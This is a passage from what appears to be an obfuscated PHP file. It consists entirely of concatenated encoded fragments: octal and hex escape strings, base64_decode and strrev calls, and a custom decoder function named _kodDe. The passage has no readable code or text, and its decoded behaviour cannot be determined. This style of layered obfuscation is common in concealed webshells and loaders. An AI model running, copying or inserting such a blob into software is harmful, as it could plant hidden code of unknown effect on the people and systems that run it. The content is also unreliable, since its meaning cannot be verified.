d2zuSSFfq5OjE2GOOIrm7s5JxZA3S/4FWj4tPWrfIOIwfgUCh71wFIDo4GMrJA==').strrev('$Òe6m¥­X`v¢„9¦‡Ğ¬zE¬ëHií|Ma!'."\n".'d}Tn,^•1X–C"ÒJU-t~ÔË‚É‚<ûà')."\177\260\225\351\216\162\214\341\372\272\76\153\154\136\165\157\41\335\67\257\246\32\146\34\43\60\134\12\355\136\152\333\157\251\212\370\125\113\367\116\321\22\53\335\152\67\101\46\364\203\352\66\147\116\265\253\266\246".base64_decode('uZnvI92QCC0lsDpDH57lZVsiYYqsM3+fbiCQ6CPF/zqngtFJZngh+d/mdAd8pMN7+3BgDuiT5c19tQ==')."\65\275\315\25\40\54\137\110\127\6\53\66\31\364\33\33\357\30\171\131\54\106\226\266\30\175\321\214\350\56\306\210\362\42\325\63\144\172\207\264\51\325\261\130\54\205\174\263\63\315\163\2\141\356\374\253\47\200".strrev('+€È!Gº<RòˆÇğ~­ÃëìµícÆ¦÷}%	eÑ™¤O6ÕqÏ$)™'."\0".'Í®¨Ó;+Ó›Åaˆ½x')."\73\375\135\321\100\64\340\47\32\367\73\355\265\367\317\367\45\175\60\11\377\354\273\67\55\22\164\156\154\270\256\16\374\315\2\177\62\370\113\202\277\24\44\341\230\1\376\235\11\376\100\112\3\200\66\50\261\341"."\x69\x9\xf0\x7\x52\x67\x80\xdf\x19\x10\x2b\xd\xfe\xa6\x71\x2e\xd2\xdc\xcc\xb\x6\xad\xf5\x38\x5b\x41\xb3\x2b\x15\xe\xb2\x34\x33\xa\x17\x2a\x8\x37\xfd\x89\x95\x94\x6f\xd2\xb3\x9\xf8\xf4\x85\x22\xd3\x39\x24\xe7\x98\xae\x8e\xf0"."\xa0\x1a\xfc\x64\x4c\x87\xf3\xe\xce\x3a\x3e\x3d\xaa\xa1\x31\x27\xc2\x83\xb3\xb5\x42\x4d\x38\x2e\xc3\xb4\x34\x62\x3c\x1a\xee\xfe\xcf\x58\xe2\x34\x66\xcd\x9a\xe2\x74\xd5\x4d\xad\x6f\x68\x9c\x36\x7d\x6\xf5\x40\x53\x28\xe5\x15\x9d\x9e"."\xb8\xb8\x91\xb3\xcb\x6\xf8\xa3\xa6\xe8\xf\x3f\xcb\xb1\x9e\x58\x17\xd\xea\xf7\x20\xcf\xdc\xb\x0\xde\x48\x97\x7d\x41\xeb\xc9\x10\xf5\xc4\xfa\x95\x91\x4e\x7a\x40\x1\x97\xca\x34\xbc\xee\x22\x69\x33\x5b\x42\x84\x72\xdc\xb1\x5e\xc8"."\x6d\x62\x94\x12\xa1\xbf\x5f\x41\x13\x88\xc4\x22\x59\x7a\xa2\x3a\xa9\xae\x3e\xd5\xc4\xfe\xb1\xc1\xa8\x48\x94\x31\x5c\x42\x5d\xf1\x3b\x58\x72\x9\xb4\x89\x1e\x5a\xae\x2c\x66\x78\xc5\xa2\xc2\x93\x59\x80\x8\xc\x2f\xbe\x92\x15\x8e\xc4"."\x61\x89\x42\xd9\xc2\x89\x25\x8a\xc3\x77\xc6\xa8\xec\x83\x1\xdc\xe1\x88\x98\x26\x80\xe7\xbb\x80\xbc\x94\x76\xf9\x97\x4\x5a\x5d\x5e\xf8\x4\x58\xa4\xc8\xac\xdb\x8d\x70\x1b\x51\xb5\x65\x1\x54\x79\x17\xdc\xf5\x15\x94\x1c\xbd\x51\x86"."\227\211\141\266\306\201\46\71\126\26\225\214\243\130\310\70\62\152\332\221\310\27\35\246\232\116\303\177\34\140\14\35\305\144\312\141\14\146\34\112\132\36\166\14\51\211\42\165\157\256\327\73\24\75\355\350\117\45"."\x1d\xa9\xa4\xee\x48\x81\x2\xa\xfa\x90\xa3\xa0\xa4\x1d\x1a\x80\xeb\x43\xf5\x8e\x22\x8\x1b\x0\x26\x83\x3f\x43\x27\xde\x3b\x6\xd5\x94\xa2\x81\xbd\x95\xa1\xe5\x4a\x48\xeb\x6b\x78\x1c\xf8\x8\x15\x83\x28\x64\x89\xa5\x17\x2\xad\xbe"."\x3a\xd7\x92\x30\x4b\x1d\x76\x8c\x93\x60\x2f\x66\xe9\x4f\x16\x33\x62\x29\x66\xa9\xbd\x18\x31\xd1\x47\xfd\xd2\xcf\xc7\x43\x42\xe3\xf8\x55\x33\x39\x7\xfd\xdc\x93\xff\x86\xf3\x45\x17\xfc\x43\x62\x84\x2\x11\x1d\x68\xcc\xe7\x43\x9f\x14"."\x82\x86\x86\x8b\x22\xa2\xeb\xa8\x11\x2e\x8c\x68\xba\xa\x24\x63\xb9\x72\x45\x82\xf6\x44\x43\x4b\x9b\x43\x4c\x55\x4c\x44\x8d\x90\x14\xa1\x6e\xa4\x22\x2c\x85\xc4\x8d\x72\x4c\x4b\x2b\x34\x3d\xca\xde\xfd\x49\xa8\x66\x8\xec\xc3\x65\xae"."\300\211\107\23\300\215\170\21\132\274\12\111\20\10\260\103\352\60\65\105\237\357\302\127\324\34\277\10\23\35\14\256\313\103\266\64\102\204\266\111\120\171\202\200\162\340\354\240\205\301\203\321\70\74\27\25\132\66"."\xdf\x15\x68\xf7\x85\x5d\xa8\x3c\x64\x1c\xc9\xbf\xd\xef\x5d\x75\xd1\xe7\x2\xfe\x28\x13\xb0\x19\x62\x26\xa7\x25\xe4\x5c\x1c\x97\xc1\x2f\xf5\xe4\x2\xe0\x2a\xcc\x67\xc0\x7c\x17\x8e\x83\xd2\x5c\xd6\x94\xc\x55\xcb\xca\x69\x85\x8c\x6a".base64_decode('llLWNrWFIqgqJZDBZUPJgfL+QwYLhpz7T/hWjJQyqCaVTrm/AkFBKCWZPMPAOTiPt+SAhyssC3+eCg==')."\x31\x5f\x1f\x3b\x19\x14\xb3\x4\x68\x12\x3c\xe\x7\x5d\x47\x73\xa3\x2c\x29\xe\x17\xa\xf2\x8\x2c\x54\x2c\xa\xb3\x56\x5a\x80\xc8\x68\x93\x80\x33\x52\x2b\x53\xf\x20\x34\xa8\x87\xd4\x2a\xee\x3c\x48\x31\xde\x60\x67\xa8\x3b\xea\xf7"."\271\52\42\121\240\160\201\41\122\145\205\144\170\32\15\166\346\350\74\162\234\134\343\240\40\275\64\120\30\77\101\25\63\225\247\266\102\275\125\121\255\121\104\57\113\24\0\201\102\303\264\174\276\125\315\125\130\210".base64_decode('fgINJJUMH+hgbm9k78MKKIFIEDUUrFL8zWHxixURerKqqbTIubJPoSzlqbR3uPphpb7jqRTSosrGOA==')."\243\124\206\342\137\54\54\304\44\50\47\35\162\312\64\34\162\311\41\347\165\207\74\250\73\22\132\241\337\221\62\322\340\317\160\200\245\27\46\247\163\0\61\47\73\162\200\201\71\362\152\112\165\344\101\100\65\35"."\xc3\x79\x87\xd1\x90\x27\x8b\x70\xbe\x8\x12\x8b\xd\xe\x2d\xad\x3b\xf4\x7e\x50\xa4\x91\x85\x73\xa3\xdf\x31\x24\xf\x3a\x86\xf2\xb2\x23\xdf\x28\x3b\xb4\x4c\xc6\x31\x38\x90\x76\xc\xd\x3a\x6\xb5\xa4\xc3\xa4\x47\xc8\x54\x4c\x8a\x1b"."\242\256\343\100\111\115\366\103\260\13\376\3\306\45\137\64\342\245\202\72\114\235\275\347\65\155\120\312\17\122\217\143\343\343\143\175\151\73\76\26\112\0\337\323\65\243\137\166\41\235\53\105\267\57\107\54\275\227"."\x20\x8c\x41\xa5\x44\x30\xda\x72\xb1\xe8\x0\x2\x4d\xa\x6c\x3b\x91\x95\x70\x9f\x3d\x27\xaf\x4f\x2f\x5b\x5\xa9\x62\x57\x1c\x4a\x6a\x62\xe\x5c\x19\xfa\x9\x2c\x27\x8\x4a\x2c\x30\x11\xaf\x5c\x71\xdd\x72\x8a\xce\x9c\xa8\xc0\xe3\x14"."\x51\x44\x25\x22\x17\x28\x8e\x7a\x26\xc2\x2b\xa3\x60\xda\x80\x51\xc6\x5b\x19\xed\x9f\xb7\x80\x7a\x81\xbc\x3d\x38\x75\xc\xfe\x5b\x3f\x26\x3\xde\x3a\xa8\xe9\x9\xd5\xa0\x6f\x78\xb1\xa6\xf7\x89\xc2\xe6\x7f\x9f\x49\x64\x86\xff\x43\x2e"."\56\237\146\224\202\376\77\177\125\310\64\242\120\323\242\377\76\73\317\3\72\212\132\266\377\17\35\5\63\305\305\347\364\10\222\341\52\252\111\310\251\135\165\56\176\355\202\304\32\72\367\32\301\54\35\164\244\33"."\xe1\x54\x1b\x4\xd3\x6c\xd0\x91\xd7\x6\xc1\x8c\x56\x1d\x7a\x7e\x30\xe1\xc8\xf7\xf\x82\x0\x94\x99\xf3\x60\x1e\x82\xb0\x2\x44\x42\x63\x28\x4d\xe6\x6e\x43\xa6\xde\xd1\x90\x29\x3a\x64\x30\xf1\x13\x2a\xe0\x0\xea\x60\xda\x51\x30\x6"."\35\140\366\203\377\207\114\120\34\370\315\3\131\44\17\45\364\74\20\325\7\251\153\77\260\160\52\246\354\322\12\360\321\12\370\244\203\153\10\36\335\71\306\23\256\313\361\263\350\344\255\74\303\310\377\312\6\34"."\326\11\233\44\207\152\161\301\372\342\277\146\21\266\262\160\262\120\22\256\55\332\303\10\63\162\276\213\264\2\113\211\60\301\301\344\117\216\106\62\303\33\233\144\74\247\151\375\245\242\300\12\160\52\336\145\33\256"."\xde\xba\xa9\x63\x53\xfb\x5c\x7c\x7a\xff\x27\x4c\x5c\xec\x7f\xc2\x42\x8c\x41\x40\xe2\x3d\x83\xd1\x51\x7a\xfc\xa7\xab\x48\xbe\x24\x64\x10\xf6\x90\x9c\x6f\x72\x7e\x39\x26\xf2\xcb\x31\xc2\xec\xfa\x2c\xc2\xaf\x9d\x38\x18\xd7\x85\x9\xb0"."\23\350\131\50\371\55\343\272\275\72\330\63\212\363\252\302\356\201\210\134\224\31\23\363\137\303\122\21\66\371\176\2\313\306\346\55\314\335\302\242\363\154\361\266\354\204\313\300\150\120\160\270\214\237\353\311\254\112"."\357\245\320\5\11\27\374\113\5\272\65\120\122\202\274\17\62\344\122\272\122\20\136\133\2\55\2\73\64\350\133\206\201\100\47\362\47\125\340\127\233\334\156\254\143\16\267\343\263\241\325\327\364\106\302\51\144\101"."\x95\x4b\x63\x2\xc\x9a\x4b\x38\xd8\xd6\x11\x6c\xf1\x20\x6f\x11\xf1\xf6\x20\x7d\x9e\x7c\xee\xdc\x66\x43\xbc\x40\xcb\x2\x72\x72\x82\x7a\x64\xd8\x33\xa0\x3d\xb2\xe\xd5\x24\x1c\x51\xa2\x39\x28\x91\x54\x49\x2b\xb0\x2b\x30\x72\x6c\x36".base64_decode('hFFxJNQeinu6o+2Cxw0GChE9H/QOO4QEw4FlHu5fCzSMHif19PQ44XE8tKhJoifcW2CiBPlkfm5Vvw==')."\226\112\346\264\122\252\212\27\350\236\352\252\223\32\353\246\112\335\5\252\141\112\167\117\41\135\316\344\145\370\32\246\123\170\54\323\13\203\116\57\326\123\261\47\132\36\204\246\37\307\111\140\253\1\250\116\330\120"."\7\7\25\135\60\213\240\157\234\223\337\316\340\142\77\371\140\60\104\216\27\72\27\62\155\27\237\122\244\62\265\267\354\361\154\244\240\63\234\317\315\146\352\77\302\241\351\34\137\123\121\327\212\151\265\220\222\0"._kodDe('LrE+4lidvWniJwYlRRRzhymZc6uCfmkTiwGCdfuRc/DGpeNyATAzvz6aoMOlFj/p/jWErhHk+gVkeEc=')."\257\102\165\252\222\250\243\100\144\142\204\203\123\251\333\142\321\0\230\250\232\102\303\72\241\37\140\224\231\341\40\2\361\371\241\113\5\201\74\262\354\220\334\146\373\201\201\304\46\261\135\264\111\4\35\1\227\57"."\170\17\17\173\25\166\114\22\52\45\241\111\203\273\306\222\316\162\145\24\223\334\326\42\70\254\135\312\15\227\45\147\112\325\25\344\5\7\146\266\241\125\374\50\325\255\102\356\30\4\107\216\45\141\222\53\202\11"."\65\67\377\116\60\213\14\120\44\272\316\263\15\64\211\106\346\126\21\233\105\72\57\40\257\254\152\306\154\161\116\244\111\31\206\203\12\232\334\34\104\17\225\167\151\46\122\256\232\343\26\323\0\42\321\355\155\146"."\303\5\61\50\20\25\7\133\215\252\322\154\45\132\270\235\157\222\330\53\363\234\142\113\146\232\20\354\142\131\37\151\222\52\274\126\237\253\250\114\157\242\22\11\23\353\214\126\234\264\320\266\12\124\155\356\314\351".base64_decode('jXV1jnzJMJ26Yn01GHaURI4XOyNOPLGdi1XAD3zUVBy5XmiSyERwSHR+4FDIE/W2OyRErA6pzR8F4A==')."\156\360\17\66\145\160\110\160\136\203\144\60\317\35\22\64\324\166\110\335\135\370\227\53\247\203\276\303\144\201\214\210\120\127\202\70\244\150\112\64\156\22\45\111\160\306\102\45\34\322\353\30\100\107\64\337\324\243"."\x16\x1a\xea\xa1\x6e\x3a\x36\x93\x82\xdb\x78\x42\xc\x80\x3b\x96\xf4\x42\x13\x76\x18\x65\x38\xf3\x6a\x12\x2c\xfa\x60\xc1\x75\x2\x92\x68\x82\x9a\x7e\xd6\x32\xe8\x3d\xe7\xff\x7f\x9\xb0\x16\x54\x41\xfe\xff\xbf\x14\xa8\x42\xe1\x31\xc1"."\42\223\50\231\212\361\77\225\101\31\34\353\52\254\274\324\114\126\205\251\122\175\135\235\24\134\10\321\110\312\336\102\56\332\311\204\27\340\361\41\213\70\126\333\110\311\203\364\135\342\54\234\144\152\241\110\335\151".strrev('A[¹‚¾„Õ,¬ÄÆv0*¶¸ÖŞ@Aî'."\n".'n¡´dÔå°Òkpµrë4òŞfÜ>F"')."\30\23\114\362\134\311\0\205\161\154\234\306\320\123\160\35\152\126\13\360\31\143\23\361\66\14\141\10\332\120\101\241\223\36\346\207\166\204\156\4\164\163\306\14\363\141\104\226\217\270\37\155\16\340\242\25\210\102".base64_decode('YdZWQauxZjortKI8UFIYvMk2S1ibUSZGBrYeo1iWrmXkgouErwM6o+gbnAEV8ArRJEFv107ATwbLWA==').strrev('\\Š)æ¤ã[W«|Kc—»$±Ÿ°jV%GPEÃı8—'."\r".'ˆŠÂé}uŠÊäÿˆ»\'—À-r')."\xe7\x9\x83\x68\x99\x22\x4c\x1a\xa\xab\x24\x3c\x8\xe6\x3\xf4\x3b\x9b\x9a\x6a\x7\xd4\x53\x6c\x2d\x9d\x86\xa7\x15\x24\x46\xb0\xd0\x76\x93\x66\xc1\x7b\x49\x1a\x2b\xe6\xe4\x82\x62\xd0\x18\xc8\x2a\xca\xbd\x8b\xc5\x8c\x8b\xad\x19\x19".strrev('RW"H'."\n".'Q]8§ê7è:’¬Ê@Şjã—It:s\'ÆGÂLÈ)gÃ’¢ñÃ L ±ÇªÅŞM*')."\54\0\71\127\314\312\10\202\1\344\155\20\157\302\355\315\270\275\272\333\113\166\342\344\111\161\362\102\235\227\254\132\304\331\26\175\121\4\65\20\157\264\241\167\236\214\232\256\10\207\133\205\212\11\105\52\325\15"."\x71\x85\x9e\xac\xa0\x6a\x3\xcf\x2c\xe3\xd0\x6a\x28\xce\x8f\x36\xca\x2e\x91\x50\x99\x61\xcd\x64\xcb\xac\xf0\x11\x78\x3\x8e\x2e\x3a\x8\xb3\xe0\xcf\xd8\x42\x9c\x74\x8e\x6a\x85\x5\x3a\xdb\xe2\xad\x1d\x81\x50\x1c\xed\x3\x82\x5d\x51"."\117\207\55\1\60\326\150\300\133\6\156\11\122\157\301\266\246\45\362\126\255\65\265\200\144\201\20\167\106\4\242\262\301\274\345\22\47\224\44\17\64\57\300\301\331\163\22\272\233\332\152\46\204\135\221\221\227\163".strrev('?Íâ=H?q0)8ğ¢R—w)xOa‚F~€M,vò5Ô;ì›˜&@#¦Àê'."\r".'ÕôİŞUMÊ)L')."\x3e\x7d\x98\x36\x99\xc3\xc6\x9d\xd0\xcc\x80\xdd\xb9\x3\x28\x3c\xc1\x52\xca\xa1\x72\x39\x26\xd4\xe2\x43\x56\x50\x96\x3b\xfb\xb0\xac\x7b\x70\xb\x2a\x24\x2e\x53\x8b\xe3\x24\xaa\x45\xfa\xac\x68\x91\x6a\xba\x17\x4b\xf4\x42\x9c\x1d\xc9"."\11\136\205\146\320\7\41\310\157\142\224\320\276\254\23\375\203\244\114\362\253\6\71\143\313\214\102\365\71\32\6\313\121\216\237\205\42\275\344\76\311\53\27\46\233\122\20\240\315\226\72\241\351\123\41\43\215\202"."\226\143\157\331\6\367\115\142\144\225\134\56\16\325\346\110\165\223\131\115\262\357\62\151\164\374\157\360\142\10\270\104\165\76\40\207\5\25\44\63\217\114\167\101\143\200\73\335\230\206\177\134\56\242\10\4\175\65"."\0\216\143\105\102\76\117\251\23\6\164\364\20\7\314\120\160\215\11\305\51\11\256\77\310\222\302\342\155\147\241\226\42\303\326\204\135\354\244\224\341\331\22\362\37\105\274\257\127\166\331\204\76\43\201\317\100\343".strrev('/œ`²Ø%/Å\'- X÷½@#µeèñ#úğ`jn©<+Êˆ«¢É¤B1”[›	2').base64_decode('3WRYUzqCwYjoKMpWve6Q4FqSbKLhAj+VKI52dXcQ/hUjFBwjDNtLVKRipUl1jdRgiD+0CvsmLryTjg==')."\217\335\160\130\103\333\70\34\226\222\62\66\254\111\50\130\164\120\122\320\255\54\254\235\144\0\201\232\262\373\11\320\147\264\333\135\355\232\122\63\161\102\136\204\305\152\41\60\126\353\236\320\115\252\61\201\303\0"."\xc2\x44\x6\x77\x2f\xaf\xae\x1a\x9b\x5c\xe3\xaa\xad\x8e\x4d\xad\x61\x2a\x60\x31\x6a\x8d\x16\x8b\x95\x88\x2\x55\xdf\xaa\xc6\xd5\xdc\x83\x65\xac\xd7\x55\x1b\xeb\x9b\x28\x68\xa4\xad\x2\x80\xd5\xc\x30\x94\xa5\x67\x6a\xc8\x77\x6\xc3"."\x32\x6a\xab\x7b\xab\x26\xf7\xb9\x6a\x7b\x97\xc7\x62\x7d\x30\x58\x3\x60\x4d\x10\x1e\x8b\xb8\x6a\x6b\x1c\xf3\x26\xba\xbb\x55\x43\xc4\xc7\x7e\xb8\xc7\xc5\x21\x5d\x4e\xed\xd1\x8a\xec\x82\x0\xca\x35\x2a\xd8\x4a\x21\x6b\xc\x51\x27\x37"."\xe4\x7\x4c\x59\x70\xbe\x67\xe6\x8b\x2\xd9\xe2\xb3\x38\x51\xb9\x1d\x43\xe8\x92\x52\xa2\x6b\x1f\xa\x52\x3\xb0\x22\x57\xf2\xb7\x2a\xe4\xb2\xa8\x65\xb6\xd4\x49\x2d\x40\x9e\xb3\xd8\x63\x5b\x3c\x4\xa\xb5\xd3\xa7\x8\x5\xc5\x45\x7"."\234\10\42\276\374\2\343\302\273\276\102\135\201\120\47\270\225\201\5\121\137\114\104\132\220\215\354\70\176\210\260\113\20\320\0\241\116\330\273\44\74\25\20\26\332\166\233\123\57\262\327\52\357\103\34\6\204\114"."\246\26\302\3\237\102\233\37\352\51\205\353\225\17\45\110\17\300\76\216\333\76\310\214\275\163\302\236\325\147\225\141\270\46\27\215\122\71\52\51\27\341\235\117\12\237\256\203\216\47\337\146\241\356\20\164\245\7".strrev('+…ÆŠéëÉ!	eÄ3´j§°Wak»¼:÷‘w€GñP'."\r".'zÀS•Ò@%—ó,	 W@ '."\n".'´œA9').base64_decode('3tGAfRnb0lCl96SebKhPsGnGvLpRgZ/MFLrmcycNw05mA0A3RT7uW4VkQ6ezpArI0wzJIB71iMkOqQ==')."\342\101\17\333\165\21\143\20\333\31\146\102\55\310\324\47\156\236\176\73\317\54\352\240\273\51\352\242\7\131\277\121\311\100\274\377\56\262\113\104\142\162\246\203\124\35\231\204\13\7\173\5\63\254\144\304\150\207"."\xc6\xf4\xfe\xd0\x6a\x5e\xa1\x8\xf8\xd2\x92\x60\xac\x2\x77\x32\x9e\xa4\x59\x12\x5f\x71\xe2\x86\xe7\x30\xd6\xc6\x9d\xbb\xa\xa6\x7e\xce\xa9\x12\x6b\x51\x1c\x97\x8c\x23\x53\x84\x4\xac\x6d\x5e\xc1\x5c\xd0\xe6\x83\x41\x70\xd\x8b\x6c"."\320\43\245\4\363\244\143\263\357\243\216\147\45\321\262\216\272\217\205\5\240\107\210\140\13\14\61\15\24\13\337\361\346\55\23\263\240\157\226\145\301\151\320\0\216\263\62\61\305\200\112\135\335\124\354\252\224\122"."\341\123\50\111\350\321\44\335\354\121\357\170\244\223\170\137\231\264\277\353\235\15\304\315\212\350\177\226\230\317\221\316\165\326\113\2\171\101\336\43\120\4\76\262\140\335\310\15\102\163\34\107\203\276\43\24\76\370"."\334\340\20\277\220\304\206\26\75\245\304\142\272\140\214\246\244\350\320\241\247\210\52\256\45\30\210\336\52\352\256\224\216\73\13\46\373\54\216\102\155\10\140\312\133\323\321\27\305\312\244\361\273\124\26\207\211\266"."\102\164\234\346\123\270\133\23\224\213\267\203\373\134\5\40\260\367\101\357\371\360\216\341\336\360\360\333\113\324\63\254\47\225\262\203\243\32\3\226\173\324\163\61\237\266\304\171\77\330\224\106\2\301\256\352\32\50".base64_decode('ZVn8DnSOMPfqYCTROt4pD/OBYhGayujUsESwk0pLbgZiWENKgrFtwkjbQ24GaqHdxF7TIcbW8C0DsQ==')."\xd0\x20\x91\x59\x87\xb0\x15\x15\xe1\xa5\x4d\xcc\x6f\x27\xdd\x12\xd\xe5\xd5\xa4\xd4\x11\x6c\x83\xfb\x71\x5f\x20\xb2\x50\xca\x28\xa6\xc4\x5\x21\x74\xbb\x61\x9d\xf9\xc8\x7d\x4\x3a\xd\xa4\x84\x9f\xa0\xaa\x31\x28\xe8\x44\x27\x27\x4e"."\213\323\42\266\113\21\35\172\302\202\312\12\306\243\56\26\7\217\135\234\51\146\174\153\303\245\202\103\131\16\361\373\102\36\270\313\261\362\12\4\46\373\37\153\71\43\12\274\100\250\374\355\122\205\357\22\374\34"."\x3f\x74\x11\x32\xa8\x85\x41\xd5\x50\x39\x1b\xa0\x5d\x35\x22\xe2\x73\x7\x1f\x65\xbd\x8a\x1a\x25\xa0\x42\x67\x66\xdc\x36\x9d\x75\x30\xfb\x62\x99\xcd\x34\x8f\x63\x1c\xf2\x9a\x9b\x60\x9d\x8b\x7\x47\x7c\xd5\xb0\x48\x1d\xd9\x90\x4b\x7a".base64_decode('SgkkKtx3F3VZNRQBYHnzkODHMRaGhQNt7dH/ujg1xd8vtFVGTVF5kfkOB1IiKg/r/liqANUbOKcI+A==').base64_decode('HOihOe6MFgWBROmAB1yoAg5+0R9Hd8lkEqkaMoMl1p8YFgjG8athOOq2C8lpZFKKbJQEN0luejLJfA==')."\x89\xc3\x3\x6a\x3f\x75\x98\x2\x23\xdc\x6a\x95\x7b\x93\xa5\x2e\x75\x61\x1\xe4\x83\xb0\x46\xd8\x92\x59\xd5\xd0\xb3\x1f\xd4\xe2\x95\x58\xe1\xb3\x46\xe1\xa8\xdd\x7\x6f\x56\x94\xa6\xcb\xca\x82\xb2\xf6\xf8\xe5\x80\x7c\x12\x37\xf2\x67"."\x8\xd2\x5c\xa9\xe\xf9\x8a\xe0\xbe\x54\xa5\x39\xf4\x45\x3\xfe\x9\xf4\x58\x9d\x3f\x5f\xa4\xef\xc6\x62\xa3\xec\x76\xd5\xe0\x2f\x93\x20\x61\x83\x6f\xaa\xa0\x4\xa7\xe5\x47\xca\x0\x16\xab\xff\xe\x5a\xd\xe6\xd2\x15\x1a\xb4\x14\xd2"."\x9a\xd8\x6a\xc4\xe4\xc0\x5a\xe1\x40\x1\x3f\xe0\x2a\x38\x84\xad\xbe\x1d\xf0\x74\xdc\xc\x21\x8a\xea\x50\x6\x15\x6b\x39\xe3\x16\x6a\xd8\x97\x9\x2e\xbd\x0\x76\x0\xed\x54\xb8\xaa\x34\x85\x8\xb2\x8a\x85\xf1\xa2\x88\x40\xb9\xc8\x6e".base64_decode('VngHgP5CJz1MpoX1FQqchH9i5JfyWHvRYCS9RJuFkjyMliV2Klx9jtTVYVs2oC88ucA4FBxPgIT9Iw==').base64_decode('gQCfVTRNIB/mlortWJEPWnZyDVbvKOBwGQeWPyBv4LGWETEsOvdF9YoyIx01xUZIvM130lSom0Y5BA==').base64_decode('J1+cKpAzYztibmwaEMbeMl3YCQlO0cE2grnEtaARpgG2WuO6yyEyAXadUyoE8CsOFqgubFNE98rYSQ==')."\20\167\220\117\320\301\327\102\330\53\20\151\266\130\44\365\314\204\176\340\106\6\314\130\146\122\356\56\367\344\124\356\25\23\372\367\244\102\207\340\17\227\270\334\162\211\73\13\202\40\315\221\370\220\133\246\24\24"."\334\340\74\105\1\64\117\105\361\263\62\324\62\117\21\12\43\102\364\320\50\243\107\330\307\344\307\247\244\231\140\16\343\174\7\47\276\152\203\11\313\303\244\30\132\70\372\205\274\322\201\33\347\140\264\257\32\35".base64_decode('SOvTiGD51AFvTMEP3mMYDv76gQPffiBTIzvl5biDLdD5vHGwplGxoRa52C4Ss96yZQjbezSqlXu/4A==')."\116\255\12\245\74\367\43\6\42\326\55\102\131\203\205\26\226\364\234\3\351\54\73\350\63\217\266\356\20\352\20\67\205\66\62\161\324\66\122\25\172\367\77\226\116\34\47\243\35\1\220\250\260\7\21\234\324\204"."\156\213\52\243\251\26\222\4\133\162\176\16\217\137\261\55\332\227\213\245\371\124\175\303\264\131\342\46\234\217\34\167\114\104\356\107\210\176\25\75\157\144\264\40\131\51\115\242\117\347\212\323\34\45\132\375\77\223"."\xc7\x8e\x5\x36\x6f\x63\xc7\xff\xd5\x4c\xf0\x54\x92\xd7\x71\x26\xe1\x58\x90\x95\x8c\xbb\x80\x5\x84\xbe\x40\x84\x2a\xb8\x1e\x14\x56\x29\x9b\x3f\x39\xd\x5a\xf1\x1b\xfc\xc3\x78\xa5\xe1\xd3\xd9\xfa\x2d\xf4\x89\x4a\x2d\xfa\xff\x6f\x33".strrev('¼.«#°CôAÌû54KK°²x'."\n".'GÊuf<¿W@Cİ&\\»å+¶ÙşO…PPº'."\r".'Ú†ó')."\x3d\xe5\x73\x95\xf7\x23\x7e\x4e\xf6\xbf\xef\x16\xba\xd\xc0\x3b\x9\xee\x99\xb0\x42\x2f\xb8\xe7\x53\xde\x4\x5a\x2d\xee\x51\x64\xab\x8b\xb7\x9f\x68\x3\x16\xbe\x98\xf\x0\xa7\x6c\x3a\x5\xd2\x16\xe\xcc\x14\x33\x88\x8\x84\x88\x34".strrev('/)4âAP&—Å«§…¯2ÙsAœûƒz ¸àÊM[e48¦=qœ‚vù$<i}\\ò +jO|').strrev(''."\n".'¤6İœâ'."\0".'ö)O`OjÜâ3e–â1= ¢ıõš˜§L(•‚¯’<{OF‹I´‰’úu')."\x1b\x22\x22\xe5\x73\x69\x19\x35\x54\xf0\xa7\x45\x8e\x63\x78\x4f\x79\x98\x84\x26\x3e\xd8\xd\xa2\x8c\x98\xc9\xd2\x4b\x18\x24\x72\xe1\x8d\x3f\x2b\xac\xac\x7c\x11\xe5\xa1\x2e\x6a\xd8\x2\x23\xc2\x61\x24\xda\x7c\xb0\xc4\xac\xb8\x2f\x81".base64_decode('76/hEBWuWS3QYlBpXuFKQKIkyzsK0gUIar4jg3OYpxIfxQ36CRkBFsdcyLcRqddWOetyt5eYSojKYQ==')."\x89\x91\x8\x97\xf2\x91\x9\x81\x70\x95\x89\xe2\xcc\x55\x30\x7d\x47\x8f\x3e\xaf\x27\x33\xdf\x46\xd0\x29\x14\xdb\xcc\xe3\xa3\x4e\x82\x92\xcb\xf1\xa5\x55\x7c\xdf\x28\x97\x90\x75\x17\x20\xae\x7e\x93\x3a\xd1\xab\x14\x11\x25\xfd\xa\xfb"."\x47\x2a\x72\xf2\x6\x14\xd4\x64\x7f\x5\xa7\x59\xb0\xeb\xa1\xfe\x98\xb0\xaa\x9\xb2\x40\x19\x1a\x67\x2d\x40\x64\x60\x7a\x9f\x34\x84\xb6\x4f\x50\x80\xa4\x3c\x4c\x7c\x54\x26\xc8\x54\x1d\x6a\x8\xdb\xec\x9b\x4f\x79\x1\x9c\x80\xf4\xbc"."\x54\x64\x3\x16\x50\x19\xf3\x88\x5a\x96\x3c\xb\x50\xec\x1e\x42\x4\xf0\xc1\x6\x4a\xf\x96\x1c\xd0\xc9\x56\x8b\xb0\x67\xc1\x48\x86\xd8\xb7\x96\x63\xde\x72\x1f\x6a\xe5\xb9\xd9\x74\x14\xb3\xc0\xc7\xd9\xad\x47\x28\x62\x51\x58\x1d\x1"."\x6e\xf1\xc3\x70\x13\xee\xb2\x15\xc7\xe6\x4b\xc5\x39\xa2\x1a\xf8\x98\x59\xdc\x69\x82\x90\x58\x31\x3a\xc9\x42\xba\x86\x4\x24\x2b\x94\x9d\x19\x8\xa6\x75\x82\x5e\x5b\xc4\xce\xa6\x6c\x47\xdf\x60\x2b\x23\x5c\xb\xe1\x87\x67\x55\xd\x69".base64_decode('b3giEmBWUqS7sxp52ocAGMCPF64g8toKaW9J+A8/YVkNk2EhK6RAF39EvEbiTy/idEKtQMJv1di4ww==').base64_decode('a25BI2rbLZdsW3M9fkcbv6tN+gm/JCIiicnW50agh3DrVGmuhJbUdENAEx7UWQQfTsDBTrVAX7khMw==')."\200\146\257\124\44\40\221\210\151\31\114\50\14\123\11\34\354\61\44\76\364\150\37\215\267\306\226\35\62\321\51\23\101\302\15\31\264\256\260\272\77\106\211\10\114\237\265\45\45\10\27\73\326\53\66\215\256\242"."\145\34\255\244\166\10\311\50\27\175\41\21\374\302\307\107\2\334\73\11\112\306\307\316\236\101\231\351\133\331\163\165\133\166\26\302\205\134\22\221\56\337\361\241\214\11\120\113\364\217\247\250\332\163\230\131\125\117".base64_decode('taiFlB2/VEgwKEcHg9FSCQzEMs7UbXBh/eFsVR7klzNcPk6lWuXBCqjMlwCDAghDRRKS8EYS95utDA==').base64_decode('iV8neOny1QcilkP5G0r2dqEJx+DkjowvOYzcOAjhJJk7SmGTAdU1uZ9KXEe2E+eftD71xNCY9AZwkA==')."\331\205\323\2\265\155\265\340\201\55\135\207\155\111\344\30\100\50\276\342\151\201\205\24\72\204\342\304\53\271\161\63\104\52\177\204\323\